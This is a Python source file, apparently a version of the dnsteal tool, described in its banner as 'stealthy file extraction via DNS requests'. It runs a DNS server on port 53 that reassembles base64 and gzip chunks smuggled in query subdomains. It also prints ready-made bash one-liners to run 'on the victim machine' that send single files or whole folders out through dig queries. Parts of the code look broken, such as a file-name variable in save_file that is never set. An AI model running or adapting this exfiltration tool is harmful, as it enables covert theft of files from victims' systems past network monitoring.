#!/usr/bin/env python
#  g0dmode
########################
import argparse
import base64
import binascii
import hashlib
import logging
import logging.config
import re
import socket
import sys
import time
import zlib
from typing import Optional

import structlog

VERSION = "2.0"

DNS_QUESTION_INDEX = 12

logger = structlog.get_logger()


def configure_logging(
    level: int = 10,
    log_file: Optional[str] = None,
    color: bool = True,
):
    """Configures the logging system

    Args:
        level: The log level
        log_file: Optional the log file to log the json log to
        color: If the console log should print in colors or not
    """
    # ensure we start from default config
    structlog.reset_defaults()

    timestamper = structlog.processors.TimeStamper(
        utc=True,
        key="timestamp",
    )
    # shared processors for standard lib and structlog
    shared_processors = [
        structlog.stdlib.add_log_level,
        timestamper,
        structlog.stdlib.PositionalArgumentsFormatter(),
        structlog.processors.StackInfoRenderer(),
        structlog.processors.format_exc_info,
    ]

    # processor only for structlog
    processors = [structlog.stdlib.filter_by_level]
    processors.extend(shared_processors)
    processors.append(structlog.stdlib.ProcessorFormatter.wrap_for_formatter)

    handlers = {}
    # configure console logging
    handlers["console"] = {
        "level": "DEBUG",
        "class": "logging.StreamHandler",
        "formatter": "color" if color else "plain",
    }

    # configure file logging
    if log_file is not None:
        handlers["file"] = {
            "level": "DEBUG",
            "class": "logging.handlers.WatchedFileHandler",
            "filename": log_file,
            "formatter": "json",
        }
    # log formatters
    log_formatters = {
        "plain": {
            "()": structlog.stdlib.ProcessorFormatter,
            "processor": structlog.dev.ConsoleRenderer(colors=False),
            "foreign_pre_chain": shared_processors,
        },
        "json": {
            "()": structlog.stdlib.ProcessorFormatter,
            "processor": structlog.processors.JSONRenderer(
                sort_keys=True,
            ),
            "foreign_pre_chain": shared_processors,
        },
    }
    if color:
        log_formatters["color"] = {
            "()": structlog.stdlib.ProcessorFormatter,
            "processor": structlog.dev.ConsoleRenderer(colors=True),
            "foreign_pre_chain": shared_processors,
        }
    # configure standard lib logging
    logging.config.dictConfig(
        {
            "version": 1,
            "disable_existing_loggers": False,
            "formatters": log_formatters,
            "handlers": handlers,
            "loggers": {"": {"handlers": handlers.keys(), "propagate": True}},
        }
    )

    # apply structlog config
    structlog.configure(
        processors=processors,
        context_class=dict,
        logger_factory=structlog.stdlib.LoggerFactory(),
        wrapper_class=structlog.stdlib.BoundLogger,
        cache_logger_on_first_use=True,
    )

    # set the log level
    logger.setLevel(level)


def first_rr_index(dns):
    """Get the index of the first resource record of an dns message."""
    # header takes up 12 bytes
    i = DNS_QUESTION_INDEX
    # skip the qname
    # QNAME is in domain format: [len]label,[len]label,...,0
    label_len = dns[i]
    while label_len != 0:
        i += label_len + 1
        label_len = dns[i]
    # skip the last null-label, the qtype and qclass
    i += 5
    return i


def test_first_rr_index():
    dns = (
        "\x00\x00\x00\x00"
        + "\x00\x01"
        + "\x00\x00"
        + "\x00\x00"
        + "\x00\x00"
        + "\x06google\x02de\x00"
        + "\x00\x00"
        + "\x00\x00"
    )

    i = first_rr_index(dns)
    assert i == 27

    dns = (
        "\x00\x00\x00\x00"
        + "\x00\x01"
        + "\x00\x00"
        + "\x00\x00"
        + "\x00\x00"
        + "\x00"
        + "\x00\x00"
        + "\x00\x00"
    )
    i = first_rr_index(dns)
    assert i == 17


class DNSQuery:
    def __init__(self, data):
        self.data = data
        self.data_text = b""

        tipo = (data[2] >> 3) & 15  # Opcode bits
        if tipo == 0:  # Standard query
            ini = 12
            lon = data[ini]
        while lon != 0:
            self.data_text += data[ini + 1 : ini + lon + 1] + b"."
            ini += lon + 1
            lon = data[ini]

    def request(self, ip):
        packet = b""
        rr_i = first_rr_index(self.data)
        if self.data_text:
            packet += self.data[:2] + b"\x81\x80"
            packet += (
                self.data[4:6] + b"\x00\x01" + b"\x00\x00\x00\x00"
            )  # Questions and Answers Counts
            packet += self.data[12:rr_i]  # Original Domain Name Question
            packet += b"\xc0\x0c"  # Pointer to domain name
            packet += b"\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04"  # Response type, ttl and resource data length -> 4 bytes
            packet += (str.join("", [chr(int(x)) for x in ip.split(".")])).encode(
                "utf-8"
            )  # 4bytes of IP
            packet += self.data[rr_i:]
        return packet


def save_file(key, value, z):
    file_seed = time.strftime("%Y-%m-%d_%H-%M-%S")
    # fname = f"received_{file_seed}_{key}"
    flatdata = b""

    if not value:
        logger.debug(
            "Skipping reassembly of file, since no payload was received.",
            file=fname,
        )
        return

    logger.debug("Reassembling file", file=fname, value=value)

    try:
        for i in range(0, max(value.keys()) + 1):
            for block in value[i]:
                fixed_block = block[:-1].replace(b"*", b"+")
                flatdata += fixed_block
    except KeyError as key_error:
        logger.exception("Missing index for file.", key=key, exc_info=True)

    try:
        f = open(fname, "wb")
    except Exception:
        logger.exception("Failed opening file", file=fname, exc_info=True)
        exit(1)
    try:
        logger.debug("Base64 decoding data.", key=key)
        flatdata = base64.b64decode(
            flatdata
        )  # test if padding correct by using a try/catch
    except Exception:
        f.close()
        logger.exception("Incorrect padding on base64 encoded data..")
        exit(1)

    if z:
        logger.debug("Unzipping data", key=key)

        try:
            x = zlib.decompressobj(16 + zlib.MAX_WBITS)
            flatdata = x.decompress(flatdata)
        except:
            logger.exception("Could not unzip data, did you specify the -z switch ?")
            exit(1)

    logger.info("Saving received bytes to file", file=fname)
    f.write(flatdata)
    f.close()

    md5sum = hashlib.md5(open(fname, "rb").read()).hexdigest()
    logger.info("Saved file", file=fname, md5sum=md5sum)


def p_cmds(s, b, ip, z, domain, force_ip):

    logger.info("On the victim machine, use any of the following commands:")
    logger.info("Remember to set filename for individual file transfer.")
    dig = f"dig @{ip}" if force_ip or domain is None else "dig"
    domain_str = f".{domain}" if domain is not None else ""
    if z:
        logger.info(
            "Copy individual file (ZIP enabled)",
            cmd=(
                f"f=file.txt; s={s};b={b};c=0;ix=0; "
                'for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do '
                'if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); '
                f'do {dig} `echo -ne 3x6-.${{ix}}-.$r$f{domain_str}|tr "+" "*"` +short;ix=$(($ix+1)); done; '
                f'{dig} `echo 3x7-.0-.$f{domain_str}|tr "+" "*"` +short'
            ),
        )
        logger.info(
            "Copy entire folder (ZIP enabled)",
            cmd=(
                f"for f in $(ls .); do s={s};b={b};c=0;ix=0; "
                'for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do '
                'if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); '
                f'do {dig} `echo -ne 3x6-.${{ix}}-.$r$f{domain_str}|tr "+" "*"` +short;ix=$(($ix+1)); done; '
                f'{dig} `echo 3x7-.0-.$f{domain_str}|tr "+" "*"` +short; done;'
            ),
        )
    else:
        logger.info(
            "Copy individual file",
            cmd=(
                f"f=file.txt; s={s};b={b};c=0;ix=0; "
                'for r in $(for i in $(base64 -w0 $f| sed "s/.\{$b\}/&\\n/g");do '
                'if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); '
                f'do {dig} `echo -ne 3x6-.${{ix}}-.$r$f{domain_str}|tr "+" "*"` +short;ix=$(($ix+1)); done; '
                f'{dig} `echo 3x7-.0-.$f{domain_str}|tr "+" "*"` +short'
            ),
        )
        logger.info(
            "Copy entire folder",
            cmd=(
                f"for f in $(ls .); do s={s};b={b};c=0;ix=0; "
                'for r in $(for i in $(base64 -w0 $f | sed "s/.\{$b\}/&\\n/g");do '
                'if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); '
                f'do {dig} `echo -ne 3x6-.${{ix}}-.$r$f{domain_str}|tr "+" "*"` +short; ix=$(($ix+1)); done; '
                f'{dig} `echo 3x7-.0-.$f{domain_str}|tr "+" "*"` +short; done;'
            ),
        )


def banner():
    return f"""
\033[1;32m___  _  _ ___ _            _
|   \| \| / __| |_ ___ __ _| |
| |) | .` \__ \  _/ -_) _` | |
|___/|_|\_|___/\__\___\__,_|_|v{VERSION}

-- https://github.com/m57/dnsteal.git --\033[0m

Stealthy file extraction via DNS requests
        """


if __name__ == "__main__":
    ###########################

    parser = argparse.ArgumentParser(
        description=banner()
        + """
-------- Do not change the parameters unless you understand! --------
The query length cannot exceed 253 bytes. This is including the filename.
The subdomains lengths cannot exceed 63 bytes.

Advanced:\n"""
        + f"\t{sys.argv[0]} 127.0.0.1 -z -s 4 -b 57 -f 17\t4 subdomains, 57 bytes => (57 * 4 = 232 bytes) + (4 * '.' = 236). Filename => 17 byte(s)\n"
        + f"\t{sys.argv[0]} 127.0.0.1 -z -s 4 -b 55 -f 29\t4 subdomains, 55 bytes => (55 * 4 = 220 bytes) + (4 * '.' = 224). Filename => 29 byte(s)\n"
        + f"\t{sys.argv[0]} 127.0.0.1 -z -s 4 -b 63 -f  1\t4 subdomains, 63 bytes => (62 * 4 = 248 bytes) + (4 * '.' = 252). Filename =>  1 byte(s)\n",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument(
        "-v",
        dest="v",
        action="store_true",
        help="Increase log verbosity.",
    )
    parser.add_argument(
        "-z",
        dest="z",
        action="store_true",
        help="Unzip incoming files.",
    )
    parser.add_argument(
        "-s",
        type=int,
        help="Number of data subdomains per request (default =  4, ie. $data.$data.$data.$data.$filename)",
    )
    parser.add_argument(
        "-b", type=int, help="Bytes to send per subdomain (default = 57, max=63)"
    )
    parser.add_argument(
        "-f", type=int, help="Length reserved for filename per request (default = 17)"
    )
    parser.add_argument("-l", "--log-file", type=str, help="log file location")
    parser.add_argument(
        "-d",
        "--domain",
        type=str,
        help="(Optionally) The base domain of your authoritative DNS server",
    )
    parser.add_argument(
        "--force-ip",
        dest="force_ip",
        action="store_true",
        help="If DNS IP should be queried directly even when using an authoritative DNS",
    )
    parser.add_argument(
        "--no-color",
        dest="color",
        action="store_false",
        help="Do use color log for console",
    )
    parser.add_argument("ip", type=str, help="The IP address to bind to")
    parser.set_defaults(
        v=False,
        z=False,
        s=4,
        b=56,
        f=17,
        color=True,
        force_ip=False,
    )

    args = parser.parse_args()

    z = args.z
    s = args.s
    b = args.b
    flen = args.f
    ip = args.ip
    domain = args.domain
    log_level = logging.DEBUG if args.v else logging.INFO

    configure_logging(
        level=log_level,
        log_file=args.log_file,
        color=args.color,
    )

    regx_ip = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"

    if re.match(regx_ip, ip) == None:
        parser.print_help()
        logger.error("Invalid listen IP address", ip=ip)
        exit(1)

    magic_nr_size = 4
    max_index = 5
    domain_len = 0 if domain is None else len(domain)
    if (
        (b > 63)
        or ((b * s) > 253)
        or (((b * s) + flen + domain_len + magic_nr_size + max_index) > 253)
    ):
        parser.print_help()
        logger.error(
            "Entire query cannot be > 253. Read help (-h)", s=s, b=b, flen=flen
        )
        exit(1)

    ############################################################################################
    print(banner())

    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        udp.bind((ip, 53))
    except:
        logger.exception("Cannot bind to address", ip=ip, port=53)
        exit(1)

    logger.info("DNS server listening", ip=ip, port=53)
    p_cmds(s, b, ip, z, domain, args.force_ip)
    logger.info("Once files have sent, use Ctrl+C to exit and save.")

    r_data = {}  # map of: file-name -> (map of: index -> transmitted data)
    try:
        while 1:
            # There is a bottle neck in this function, if very slow PC, will take
            # slightly longer to send as this main loop recieves the data from victim.

            data, addr = udp.recvfrom(1024)
            p = DNSQuery(data)
            udp.sendto(p.request(ip), addr)

            req_split = p.data_text.split(b".")
            req_split.pop()  # fix trailing dot... cba to fix this

            dlen = len(req_split)
            fname = b""
            tmp_data = []

            for n in range(0, dlen):
                if chr(req_split[n][len(req_split[n]) - 1]) == "-":
                    tmp_data.append(req_split[n])
                else:
                    # Filename
                    fname += req_split[n] + b"."

            fname = fname[:-1]

            # remove domain part when using auth DNS
            if domain is not None:
                fname = fname.replace(b"." + domain.encode("utf-8"), b"")

            if fname not in r_data:
                r_data[fname] = {}

            if len(tmp_data) < 2:
                logger.debug(
                    "Skipping packet since it does have less than 2 payloads",
                    packet=req_split,
                    data=tmp_data,
                )
                continue

            magic_nr = tmp_data[0]
            if magic_nr == b"3x6-":
                try:
                    index = int(tmp_data[1].rstrip(b"-"))
                except ValueError as err:
                    # This should usually not happen
                    logger.debug(
                        "Skipping packet since its index was not a number",
                        packet=req_split,
                    )
                    continue

                logger.info("Received data", data_length=len(p.data_text), file=fname)
                logger.debug(
                    "Received data text on server", data=p.data_text, ip=ip, port=53
                )

                r_data[fname][index] = tmp_data[2:]  # first 2 packets are not payload
            elif magic_nr == b"3x7-":
                logger.info("Received file end marker", file=fname)
                save_file(fname, r_data[fname], z)
                del r_data[fname]
            else:
                logger.debug(
                    "Skipping packet since it does not have magic nr 3x6",
                    packet=req_split,
                )
                continue

            # print r_data

    except KeyboardInterrupt:
        logger.info("Received Ctrl+C stopping")

    # check if we have open files and save them as is
    if len(r_data) > 0:
        logger.info("Saving unfinished files")
        for fname, value in r_data:
            save_file(fname, value, z)

    logger.info("DNS server stop listening", ip=ip, port=53)
    udp.close()
